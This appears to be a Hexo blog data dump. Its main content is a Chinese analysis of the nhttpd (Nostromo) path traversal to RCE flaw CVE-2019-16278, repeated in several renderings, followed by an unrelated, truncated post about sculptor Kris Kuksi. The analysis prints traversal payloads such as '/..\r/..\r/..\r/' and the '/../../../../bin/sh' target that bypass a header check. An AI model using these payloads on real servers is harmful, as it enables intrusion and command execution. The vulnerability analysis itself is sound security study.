method中的一个，不是则返回501状态码\n\n![M1gQhD.png](https://s2.ax1x.com/2019/11/12/M1gQhD.png)\n\n上图：判断header中是否存在”/../”,存在则返回400状态码\n\n\n\n在通过http_verify校验后，理论上是不允许出现”/../”这样导致目录穿越漏洞的字符串，导致漏洞产生的原因，需要接下来往后看。\n\n通过验证的header，紧接着通过http_proc处理，如下图1571行\n\n![M1gkp4.png](https://s2.ax1x.com/2019/11/12/M1gkp4.png)\n\n在该方法的290行处，可见使用http_header方法进行header解析\n\n[![M1g8cd.png](https://s2.ax1x.com/2019/11/12/M1g8cd.png)](https://imgchr.com/i/M1g8cd)\n\nhttp_header方法解析传入的header并在结构中返回我们的响应，如下图\n\n![M1gA1J.png](https://s2.ax1x.com/2019/11/12/M1gA1J.png)\n\n在该方法中存在如下代码\n\n[![M1gKAK.png](https://s2.ax1x.com/2019/11/12/M1gKAK.png)](https://imgchr.com/i/M1gKAK)\n\n如上图1507行，http_header方法调用strcutl方法对header_data进行解析\n\nstrcutl方法中60行处，存在如下图代码\n\n![M1gEc9.png](https://s2.ax1x.com/2019/11/12/M1gEc9.png)\n\n此处代码的本意，是通过’\\\\n’或’\\\\r\\\\n’切分传入的header字符串\n\n这里解释一下”\\\\r”、”\\\\n”以及”\\\\r\\\\n”：\n\nCR：Carriage Return，对应ASCII中转义字符\\\\r，表示回车\n\nLF：Linefeed，对应ASCII中转义字符\\\\n，表示换行\n\nCRLF：Carriage Return & Linefeed，\\\\r\\\\n，表示回车并换行\n\n\n\n由于操作系统的不同,Windows以及Linux等采用不同的换行方式：\n\nWindows操作系统采用两个字符来进行换行，即CRLF(\\\\r\\\\n)；\n\nUnix/Linux/Mac OS X操作系统采用单个字符LF(\\\\n)来进行换行\n\n![M1gEc9.png](https://s2.ax1x.com/2019/11/12/M1gEc9.png)\n\n上图代码的本意，是通过’\\\\n’或’\\\\r\\\\n’切分传入的header字符串，当for循环中原始header中出现’\\\\n’，则认为是一行数据的截至，停止对dst变量进行赋值，此时dst变量中存放的为这一行完整的数据\n\n但是在windows中，会使用\\\\r\\\\n进行换行，数据中的header会以如下形式存在：\n\n```\n”line1\\r\\nline2”\n```\n\n为了在切割header行时，为了不把”\\\\r”混入line1中，即避免存在”line1\\\\r”情况的出现，程序通过判断原始header中逐位的字符是否是”\\\\r”，若该处字符是”\\\\r”，则continue，不将该字符”\\\\r”赋值给最终的dst变量\n\n因此，程序在用这种方式处理”line1\\\\r\\\\nline2”这样的windows下的数据时，第一行的dst值会是”line1”,而不会是”line1\\\\r”\n\n但是开发者仅仅考虑在处理windows\n换行符(”\\\\r\\\\n”)换行时的问题，并简单的将”\\\\r”去除，并没有意识到攻击者可能构造的特殊情况，例如：\n\n```\n“/..\\r/..\\r/..\\r/”\n```\n\n这样的payload，在经过程序处理时，可以安全的通过http_verify对”/../”的校验。然而这人个payload在strcutl方法中，”\\\\r”会被去除，最终dst值为/../../../。这样的dst数据，最终会导致目录穿越的产生\n\n### RCE\n\nhttp_proc方法中的execve函数，如下图\n\n![M1gVXR.png](https://s2.ax1x.com/2019/11/12/M1gVXR.png)\n\nexecve()的第一个参数指定准备载入当前进程空间的新程序的路径名，第二个参数指定了传给新进程的命令行参数，最后一个参数指定了新程序的环境列表。\n\n而此处，rh-\\>rq_filef可以通过目录遍历，通过”/../../../../bin/sh”,指定web服务目录之外的bin/sh文件，造成远程代码执行漏洞的产生\n\n## 修复\n\n![](C:/Users/grq/Desktop/work/%E6%96%87%E7%AB%A0/nhttp/media/3b7968ecc31f2467da52b4b66ab0138b.png)\n\n官方给出的修复方案如上，这里不仅判断了当前字符是”\\\\r”，更是判断了”\\\\r”后一位字符是否是”\\\\n”。也就是说，只有”\\\\r\\\\n”这样的windows换行符出现时，”\\\\r”会被去除原payload” /\\\\r../..\\\\r/”经过此次修复，最终解析后的dst值仍为”/\\\\r../..\\\\r/”\n\n如果构造payload”/\\\\r\\\\n../..\\\\r\\\\n/”,虽然可以去除”\\\\r”,但由于随后的”\\\\n”导致for循环的终止，此时dst值为”/”,仍不能满足目录穿越","source":"_posts/nhttp.md","raw":"---\ntitle: nhttpd 从目录穿越到远程代码执行漏洞分析(CVE-2019-16278)\ndate: 2019-11-12 14:17:50\ntags: web漏洞分析\ncategories: 技术\ncover: https://s2.ax1x.com/2019/11/12/M1fCr9.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nnhttpd是Marcus Glocker设计的开源Web服务器，也称为NostromoWeb服务器。\n\nnhttpd通过select(2)处理正常的并发连接，但是为了提高效率（例如列目录和CGI执行），它使用fork(2)以提高效率。\n\n<!--more-->\n\n下图为nostromo以及apache和thttpd在处理1KB文件，16KB文件、执行CGI时的性能比较\n\n![M1gYnI.png](https://s2.ax1x.com/2019/11/12/M1gYnI.png)\n\n![M1gen1.png](https://s2.ax1x.com/2019/11/12/M1gen1.png)\n\n![M1gMtO.png](https://s2.ax1x.com/2019/11/12/M1gMtO.png)\n\n## 漏洞描述\n\nnhttpd 1.9.6及之前版本中存在路径穿越漏洞。攻击者可利用该漏洞访问web server路径之外的文件。\n\n## 漏洞分析\n\n### 目录穿越\n\n在main.c中，处理header处存在如下代码\n\n[![M1gn76.png](https://s2.ax1x.com/2019/11/12/M1gn76.png)](https://imgchr.com/i/M1gn76)\n\n程序将会调用http_verify对每个header进行有效性验证，如上图1568行\n\n当http_verify函数对header有效性验证通过后，会调用http_proc对header进行处理，以及后续操作\n\n\n\n跟入http_verify方法中\n\n[![M1g31H.png](https://s2.ax1x.com/2019/11/12/M1g31H.png)](https://imgchr.com/i/M1g31H)\n\n在header有效性验证环节(http_verify)中，http_verify方法验证了header是否可以被url解码、method是否效、以及是否存在”/../”目录变量这样的字符串等内容\n\n![M1gGjA.png](https://s2.ax1x.com/2019/11/12/M1gGjA.png)\n\n上图：header是否可以被url解码http_decode_header_uri，该方法有三种可能的返回值，-1(error）/ 0 (不需要解码)/ 解码后的值。-1则返回400状态码\n\n![M1gm0x.png](https://s2.ax1x.com/2019/11/12/M1gm0x.png)\n\n上图：判断header 是否是GET/POST/HEAD method中的一个，不是则返回501状态码\n\n![M1gQhD.png](https://s2.ax1x.com/2019/11/12/M1gQhD.png)\n\n上图：判断header中是否存在”/../”,存在则返回400状态码\n\n\n\n在通过http_verify校验后，理论上是不允许出现”/../”这样导致目录穿越漏洞的字符串，导致漏洞产生的原因，需要接下来往后看。\n\n通过验证的header，紧接着通过http_proc处理，如下图1571行\n\n![M1gkp4.png](https://s2.ax1x.com/2019/11/12/M1gkp4.png)\n\n在该方法的290行处，可见使用http_header方法进行header解析\n\n[![M1g8cd.png](https://s2.ax1x.com/2019/11/12/M1g8cd.png)](https://imgchr.com/i/M1g8cd)\n\nhttp_header方法解析传入的header并在结构中返回我们的响应，如下图\n\n![M1gA1J.png](https://s2.ax1x.com/2019/11/12/M1gA1J.png)\n\n在该方法中存在如下代码\n\n[![M1gKAK.png](https://s2.ax1x.com/2019/11/12/M1gKAK.png)](https://imgchr.com/i/M1gKAK)\n\n如上图1507行，http_header方法调用strcutl方法对header_data进行解析\n\nstrcutl方法中60行处，存在如下图代码\n\n![M1gEc9.png](https://s2.ax1x.com/2019/11/12/M1gEc9.png)\n\n此处代码的本意，是通过’\\\\n’或’\\\\r\\\\n’切分传入的header字符串\n\n这里解释一下”\\\\r”、”\\\\n”以及”\\\\r\\\\n”：\n\nCR：Carriage Return，对应ASCII中转义字符\\\\r，表示回车\n\nLF：Linefeed，对应ASCII中转义字符\\\\n，表示换行\n\nCRLF：Carriage Return & Linefeed，\\\\r\\\\n，表示回车并换行\n\n\n\n由于操作系统的不同,Windows以及Linux等采用不同的换行方式：\n\nWindows操作系统采用两个字符来进行换行，即CRLF(\\\\r\\\\n)；\n\nUnix/Linux/Mac OS X操作系统采用单个字符LF(\\\\n)来进行换行\n\n![M1gEc9.png](https://s2.ax1x.com/2019/11/12/M1gEc9.png)\n\n上图代码的本意，是通过’\\\\n’或’\\\\r\\\\n’切分传入的header字符串，当for循环中原始header中出现’\\\\n’，则认为是一行数据的截至，停止对dst变量进行赋值，此时dst变量中存放的为这一行完整的数据\n\n但是在windows中，会使用\\\\r\\\\n进行换行，数据中的header会以如下形式存在：\n\n```\n”line1\\r\\nline2”\n```\n\n为了在切割header行时，为了不把”\\\\r”混入line1中，即避免存在”line1\\\\r”情况的出现，程序通过判断原始header中逐位的字符是否是”\\\\r”，若该处字符是”\\\\r”，则continue，不将该字符”\\\\r”赋值给最终的dst变量\n\n因此，程序在用这种方式处理”line1\\\\r\\\\nline2”这样的windows下的数据时，第一行的dst值会是”line1”,而不会是”line1\\\\r”\n\n但是开发者仅仅考虑在处理windows\n换行符(”\\\\r\\\\n”)换行时的问题，并简单的将”\\\\r”去除，并没有意识到攻击者可能构造的特殊情况，例如：\n\n```\n“/..\\r/..\\r/..\\r/”\n```\n\n这样的payload，在经过程序处理时，可以安全的通过http_verify对”/../”的校验。然而这人个payload在strcutl方法中，”\\\\r”会被去除，最终dst值为/../../../。这样的dst数据，最终会导致目录穿越的产生\n\n### RCE\n\nhttp_proc方法中的execve函数，如下图\n\n![M1gVXR.png](https://s2.ax1x.com/2019/11/12/M1gVXR.png)\n\nexecve()的第一个参数指定准备载入当前进程空间的新程序的路径名，第二个参数指定了传给新进程的命令行参数，最后一个参数指定了新程序的环境列表。\n\n而此处，rh-\\>rq_filef可以通过目录遍历，通过”/../../../../bin/sh”,指定web服务目录之外的bin/sh文件，造成远程代码执行漏洞的产生\n\n## 修复\n\n![](C:/Users/grq/Desktop/work/%E6%96%87%E7%AB%A0/nhttp/media/3b7968ecc31f2467da52b4b66ab0138b.png)\n\n官方给出的修复方案如上，这里不仅判断了当前字符是”\\\\r”，更是判断了”\\\\r”后一位字符是否是”\\\\n”。也就是说，只有”\\\\r\\\\n”这样的windows换行符出现时，”\\\\r”会被去除原payload” /\\\\r../..\\\\r/”经过此次修复，最终解析后的dst值仍为”/\\\\r../..\\\\r/”\n\n如果构造payload”/\\\\r\\\\n../..\\\\r\\\\n/”,虽然可以去除”\\\\r”,但由于随后的”\\\\n”导致for循环的终止，此时dst值为”/”,仍不能满足目录穿越","slug":"nhttp","published":1,"updated":"2020-10-27T09:25:29.550Z","_id":"ckgrozu9l003vwsa9c23t1lce","comments":1,"layout":"post","photos":[],"link":"","content":"<p>nhttpd是Marcus Glocker设计的开源Web服务器，也称为NostromoWeb服务器。</p>\n<p>nhttpd通过select(2)处理正常的并发连接，但是为了提高效率（例如列目录和CGI执行），它使用fork(2)以提高效率。</p>\n<a id=\"more\"></a>\n\n<p>下图为nostromo以及apache和thttpd在处理1KB文件，16KB文件、执行CGI时的性能比较</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1gYnI.png\" alt=\"M1gYnI.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1gen1.png\" alt=\"M1gen1.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1gMtO.png\" alt=\"M1gMtO.png\"></p>\n<h2 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h2><p>nhttpd 1.9.6及之前版本中存在路径穿越漏洞。攻击者可利用该漏洞访问web server路径之外的文件。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><h3 id=\"目录穿越\"><a href=\"#目录穿越\" class=\"headerlink\" title=\"目录穿越\"></a>目录穿越</h3><p>在main.c中，处理header处存在如下代码</p>\n<p><a href=\"https://imgchr.com/i/M1gn76\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1gn76.png\" alt=\"M1gn76.png\"></a></p>\n<p>程序将会调用http_verify对每个header进行有效性验证，如上图1568行</p>\n<p>当http_verify函数对header有效性验证通过后，会调用http_proc对header进行处理，以及后续操作</p>\n<p>跟入http_verify方法中</p>\n<p><a href=\"https://imgchr.com/i/M1g31H\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1g31H.png\" alt=\"M1g31H.png\"></a></p>\n<p>在header有效性验证环节(http_verify)中，http_verify方法验证了header是否可以被url解码、method是否效、以及是否存在”/../”目录变量这样的字符串等内容</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1gGjA.png\" alt=\"M1gGjA.png\"></p>\n<p>上图：header是否可以被url解码http_decode_header_uri，该方法有三种可能的返回值，-1(error）/ 0 (不需要解码)/ 解码后的值。-1则返回400状态码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1gm0x.png\" alt=\"M1gm0x.png\"></p>\n<p>上图：判断header 是否是GET/POST/HEAD method中的一个，不是则返回501状态码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1gQhD.png\" alt=\"M1gQhD.png\"></p>\n<p>上图：判断header中是否存在”/../”,存在则返回400状态码</p>\n<p>在通过http_verify校验后，理论上是不允许出现”/../”这样导致目录穿越漏洞的字符串，导致漏洞产生的原因，需要接下来往后看。</p>\n<p>通过验证的header，紧接着通过http_proc处理，如下图1571行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1gkp4.png\" alt=\"M1gkp4.png\"></p>\n<p>在该方法的290行处，可见使用http_header方法进行header解析</p>\n<p><a href=\"https://imgchr.com/i/M1g8cd\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1g8cd.png\" alt=\"M1g8cd.png\"></a></p>\n<p>http_header方法解析传入的header并在结构中返回我们的响应，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1gA1J.png\" alt=\"M1gA1J.png\"></p>\n<p>在该方法中存在如下代码</p>\n<p><a href=\"https://imgchr.com/i/M1gKAK\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1gKAK.png\" alt=\"M1gKAK.png\"></a></p>\n<p>如上图1507行，http_header方法调用strcutl方法对header_data进行解析</p>\n<p>strcutl方法中60行处，存在如下图代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1gEc9.png\" alt=\"M1gEc9.png\"></p>\n<p>此处代码的本意，是通过’\\n’或’\\r\\n’切分传入的header字符串</p>\n<p>这里解释一下”\\r”、”\\n”以及”\\r\\n”：</p>\n<p>CR：Carriage Return，对应ASCII中转义字符\\r，表示回车</p>\n<p>LF：Linefeed，对应ASCII中转义字符\\n，表示换行</p>\n<p>CRLF：Carriage Return &amp; Linefeed，\\r\\n，表示回车并换行</p>\n<p>由于操作系统的不同,Windows以及Linux等采用不同的换行方式：</p>\n<p>Windows操作系统采用两个字符来进行换行，即CRLF(\\r\\n)；</p>\n<p>Unix/Linux/Mac OS X操作系统采用单个字符LF(\\n)来进行换行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1gEc9.png\" alt=\"M1gEc9.png\"></p>\n<p>上图代码的本意，是通过’\\n’或’\\r\\n’切分传入的header字符串，当for循环中原始header中出现’\\n’，则认为是一行数据的截至，停止对dst变量进行赋值，此时dst变量中存放的为这一行完整的数据</p>\n<p>但是在windows中，会使用\\r\\n进行换行，数据中的header会以如下形式存在：</p>\n<figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">”li<span class=\"symbol\">ne1</span>\\r\\<span class=\"symbol\">nline2</span>”</span><br></pre></td></tr></table></figure>\n\n<p>为了在切割header行时，为了不把”\\r”混入line1中，即避免存在”line1\\r”情况的出现，程序通过判断原始header中逐位的字符是否是”\\r”，若该处字符是”\\r”，则continue，不将该字符”\\r”赋值给最终的dst变量</p>\n<p>因此，程序在用这种方式处理”line1\\r\\nline2”这样的windows下的数据时，第一行的dst值会是”line1”,而不会是”line1\\r”</p>\n<p>但是开发者仅仅考虑在处理windows<br>换行符(”\\r\\n”)换行时的问题，并简单的将”\\r”去除，并没有意识到攻击者可能构造的特殊情况，例如：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">“<span class=\"regexp\">/..\\r/</span>..\\r<span class=\"regexp\">/..\\r/</span>”</span><br></pre></td></tr></table></figure>\n\n<p>这样的payload，在经过程序处理时，可以安全的通过http_verify对”/../”的校验。然而这人个payload在strcutl方法中，”\\r”会被去除，最终dst值为/../../../。这样的dst数据，最终会导致目录穿越的产生</p>\n<h3 id=\"RCE\"><a href=\"#RCE\" class=\"headerlink\" title=\"RCE\"></a>RCE</h3><p>http_proc方法中的execve函数，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/12/M1gVXR.png\" alt=\"M1gVXR.png\"></p>\n<p>execve()的第一个参数指定准备载入当前进程空间的新程序的路径名，第二个参数指定了传给新进程的命令行参数，最后一个参数指定了新程序的环境列表。</p>\n<p>而此处，rh-&gt;rq_filef可以通过目录遍历，通过”/../../../../bin/sh”,指定web服务目录之外的bin/sh文件，造成远程代码执行漏洞的产生</p>\n<h2 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h2><p><img src= \"/img/loading.gif\" data-lazy-src=\"C:/Users/grq/Desktop/work/%E6%96%87%E7%AB%A0/nhttp/media/3b7968ecc31f2467da52b4b66ab0138b.png\"></p>\n<p>官方给出的修复方案如上，这里不仅判断了当前字符是”\\r”，更是判断了”\\r”后一位字符是否是”\\n”。也就是说，只有”\\r\\n”这样的windows换行符出现时，”\\r”会被去除原payload” /\\r../..\\r/”经过此次修复，最终解析后的dst值仍为”/\\r../..\\r/”</p>\n<p>如果构造payload”/\\r\\n../..\\r\\n/”,虽然可以去除”\\r”,但由于随后的”\\n”导致for循环的终止，此时dst值为”/”,仍不能满足目录穿越</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>nhttpd是Marcus Glocker设计的开源Web服务器，也称为NostromoWeb服务器。</p>\n<p>nhttpd通过select(2)处理正常的并发连接，但是为了提高效率（例如列目录和CGI执行），它使用fork(2)以提高效率。</p>","more":"<p>下图为nostromo以及apache和thttpd在处理1KB文件，16KB文件、执行CGI时的性能比较</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/12/M1gYnI.png\" alt=\"M1gYnI.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/11/12/M1gen1.png\" alt=\"M1gen1.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/11/12/M1gMtO.png\" alt=\"M1gMtO.png\"></p>\n<h2 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h2><p>nhttpd 1.9.6及之前版本中存在路径穿越漏洞。攻击者可利用该漏洞访问web server路径之外的文件。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><h3 id=\"目录穿越\"><a href=\"#目录穿越\" class=\"headerlink\" title=\"目录穿越\"></a>目录穿越</h3><p>在main.c中，处理header处存在如下代码</p>\n<p><a href=\"https://imgchr.com/i/M1gn76\"><img src=\"https://s2.ax1x.com/2019/11/12/M1gn76.png\" alt=\"M1gn76.png\"></a></p>\n<p>程序将会调用http_verify对每个header进行有效性验证，如上图1568行</p>\n<p>当http_verify函数对header有效性验证通过后，会调用http_proc对header进行处理，以及后续操作</p>\n<p>跟入http_verify方法中</p>\n<p><a href=\"https://imgchr.com/i/M1g31H\"><img src=\"https://s2.ax1x.com/2019/11/12/M1g31H.png\" alt=\"M1g31H.png\"></a></p>\n<p>在header有效性验证环节(http_verify)中，http_verify方法验证了header是否可以被url解码、method是否效、以及是否存在”/../”目录变量这样的字符串等内容</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/12/M1gGjA.png\" alt=\"M1gGjA.png\"></p>\n<p>上图：header是否可以被url解码http_decode_header_uri，该方法有三种可能的返回值，-1(error）/ 0 (不需要解码)/ 解码后的值。-1则返回400状态码</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/12/M1gm0x.png\" alt=\"M1gm0x.png\"></p>\n<p>上图：判断header 是否是GET/POST/HEAD method中的一个，不是则返回501状态码</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/12/M1gQhD.png\" alt=\"M1gQhD.png\"></p>\n<p>上图：判断header中是否存在”/../”,存在则返回400状态码</p>\n<p>在通过http_verify校验后，理论上是不允许出现”/../”这样导致目录穿越漏洞的字符串，导致漏洞产生的原因，需要接下来往后看。</p>\n<p>通过验证的header，紧接着通过http_proc处理，如下图1571行</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/12/M1gkp4.png\" alt=\"M1gkp4.png\"></p>\n<p>在该方法的290行处，可见使用http_header方法进行header解析</p>\n<p><a href=\"https://imgchr.com/i/M1g8cd\"><img src=\"https://s2.ax1x.com/2019/11/12/M1g8cd.png\" alt=\"M1g8cd.png\"></a></p>\n<p>http_header方法解析传入的header并在结构中返回我们的响应，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/12/M1gA1J.png\" alt=\"M1gA1J.png\"></p>\n<p>在该方法中存在如下代码</p>\n<p><a href=\"https://imgchr.com/i/M1gKAK\"><img src=\"https://s2.ax1x.com/2019/11/12/M1gKAK.png\" alt=\"M1gKAK.png\"></a></p>\n<p>如上图1507行，http_header方法调用strcutl方法对header_data进行解析</p>\n<p>strcutl方法中60行处，存在如下图代码</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/12/M1gEc9.png\" alt=\"M1gEc9.png\"></p>\n<p>此处代码的本意，是通过’\\n’或’\\r\\n’切分传入的header字符串</p>\n<p>这里解释一下”\\r”、”\\n”以及”\\r\\n”：</p>\n<p>CR：Carriage Return，对应ASCII中转义字符\\r，表示回车</p>\n<p>LF：Linefeed，对应ASCII中转义字符\\n，表示换行</p>\n<p>CRLF：Carriage Return &amp; Linefeed，\\r\\n，表示回车并换行</p>\n<p>由于操作系统的不同,Windows以及Linux等采用不同的换行方式：</p>\n<p>Windows操作系统采用两个字符来进行换行，即CRLF(\\r\\n)；</p>\n<p>Unix/Linux/Mac OS X操作系统采用单个字符LF(\\n)来进行换行</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/12/M1gEc9.png\" alt=\"M1gEc9.png\"></p>\n<p>上图代码的本意，是通过’\\n’或’\\r\\n’切分传入的header字符串，当for循环中原始header中出现’\\n’，则认为是一行数据的截至，停止对dst变量进行赋值，此时dst变量中存放的为这一行完整的数据</p>\n<p>但是在windows中，会使用\\r\\n进行换行，数据中的header会以如下形式存在：</p>\n<figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">”li<span class=\"symbol\">ne1</span>\\r\\<span class=\"symbol\">nline2</span>”</span><br></pre></td></tr></table></figure>\n\n<p>为了在切割header行时，为了不把”\\r”混入line1中，即避免存在”line1\\r”情况的出现，程序通过判断原始header中逐位的字符是否是”\\r”，若该处字符是”\\r”，则continue，不将该字符”\\r”赋值给最终的dst变量</p>\n<p>因此，程序在用这种方式处理”line1\\r\\nline2”这样的windows下的数据时，第一行的dst值会是”line1”,而不会是”line1\\r”</p>\n<p>但是开发者仅仅考虑在处理windows<br>换行符(”\\r\\n”)换行时的问题，并简单的将”\\r”去除，并没有意识到攻击者可能构造的特殊情况，例如：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">“<span class=\"regexp\">/..\\r/</span>..\\r<span class=\"regexp\">/..\\r/</span>”</span><br></pre></td></tr></table></figure>\n\n<p>这样的payload，在经过程序处理时，可以安全的通过http_verify对”/../”的校验。然而这人个payload在strcutl方法中，”\\r”会被去除，最终dst值为/../../../。这样的dst数据，最终会导致目录穿越的产生</p>\n<h3 id=\"RCE\"><a href=\"#RCE\" class=\"headerlink\" title=\"RCE\"></a>RCE</h3><p>http_proc方法中的execve函数，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/12/M1gVXR.png\" alt=\"M1gVXR.png\"></p>\n<p>execve()的第一个参数指定准备载入当前进程空间的新程序的路径名，第二个参数指定了传给新进程的命令行参数，最后一个参数指定了新程序的环境列表。</p>\n<p>而此处，rh-&gt;rq_filef可以通过目录遍历，通过”/../../../../bin/sh”,指定web服务目录之外的bin/sh文件，造成远程代码执行漏洞的产生</p>\n<h2 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h2><p><img src=\"C:/Users/grq/Desktop/work/%E6%96%87%E7%AB%A0/nhttp/media/3b7968ecc31f2467da52b4b66ab0138b.png\"></p>\n<p>官方给出的修复方案如上，这里不仅判断了当前字符是”\\r”，更是判断了”\\r”后一位字符是否是”\\n”。也就是说，只有”\\r\\n”这样的windows换行符出现时，”\\r”会被去除原payload” /\\r../..\\r/”经过此次修复，最终解析后的dst值仍为”/\\r../..\\r/”</p>\n<p>如果构造payload”/\\r\\n../..\\r\\n/”,虽然可以去除”\\r”,但由于随后的”\\n”导致for循环的终止，此时dst值为”/”,仍不能满足目录穿越</p>"},{"title":"预言与狂想——后工业洛可可风格雕塑","date":"2017-05-20T01:06:49.000Z","_content":"<div align=\"center\">{% asset_img 0.jpg%}</div>\n如果你看过《黑帆》(Black Sails)这部美剧，一定会被其片头曲所震撼：沉闷的的光怪陆离的怪诞配乐；黑色的金属，白色的理石与昏暗的光线的碰撞；生者与死者的厮杀；在咚咚的鼓点声中压抑与振奋的奇怪体验。  \n我很喜欢片头曲中雕塑的风格，却一直不知道它们是什么，直到我偶然发现了雕塑家Kris Kuksi这个人。  \n\n这里收集了一些他的作品图片，快来一起体验下这些画风怪诞的艺术品吧。\n<!--more-->\n\n<div align=\"center\">{% asset_img 4.jpg%}<font color=#A9A9A9>安宁</font> </div>\nKris Kuksi 1973年3月2日出生在密苏里斯普林菲尔德， 他的母亲是一位蓝领.二个哥哥、空旷环境、稀稀落落的树和醺酒的继父，为他的想像力和个性铺平了道路。他异常迷恋艺术，奇异风格对他来讲是美丽的。  \n童年消极的生活环境使他在艺术取得了突破性进展，同时也使他厌恶美国生活和流行文化，他决定在“旧世界”里寻找着自己的东西！他希望他的艺术暴露人的虚伪，揭幕一个新的水平视角。\n<div align=\"center\">{% asset_img 1.jpg%}<font color=#A9A9A9>造访</font> </div>\nKris Kuksi创作的灵感来自工业世界里那些复杂的机器、管子、网络、电报、提炼厂等等；  \n他以巴洛克和洛可可式的流动的优美，并且融入了一点古怪和恐怖元素，创作了这些令人吃惊和独特的雕塑作品。 \n<div align=\"center\">{% asset_img 2.jpg%}<font color=#A9A9A9>泰古</font> </div>\n雕塑家Kris Kuksi的作品中，往往充斥着些深邃噩梦般的元素，让人想到那些阴谋的主使。不过这仅仅是外表而已，Kris Kuksi的作品中渗透出的对于死亡和无望境地冷嘲热讽反而让人们感到他像是一个将火种带回人间的普罗米修斯的对立面，一个将恐怖带到人间英雄。他的作品并没有血腥的元素，而是一种弥漫着一种宗教感般沉重的气息。然而，一个好作品就应该是这样的。\n<div align=\"center\">{% asset_img 3.jpg%}<font color=#A9A9A9>银行战车</font> </div>\n在雕塑界多年来具有突破性的作品少而又少，看到他的作品可能令人想到大师Hieronymus Bosch的荒诞不经, Lovecraft的暗黑狂想, 以及H.R.GIGER的淫邪之美。\n<div align=\"center\">{% asset_img 5.jpg%}</div><div align=\"center\"><font color=#A9A9A9>洲际导弹</font> </div>\n他的雕塑作品融合东方西方的古典雕塑形式，但是将新时代的设计语言和观念与古典融合，由此我们看到的是一个具有古典形式美的外表下的荒诞现实。这种形式和内容之间的矛盾构成他艺术中的暗黑特点。  \n<div align=\"center\">{% asset_img 11.jpg%}</div><div align=\"center\"><font color=#A9A9A9>罗马帝王</div></font> \n他的作品很多表现的是死亡，阴暗，破坏，邪恶与宗教般的庄严，严谨相结合，他起家于绘画，平平淡淡，不知道那根神经东起了最繁杂的古典雕塑的形式，那些卷曲的花叶和手持机枪的战神，多到让人眼花缭乱的细节都充满工匠气味，但是就是这样的繁杂瞬间超越了现代雕塑的冷漠和枯燥\n<div align=\"center\">{% asset_img 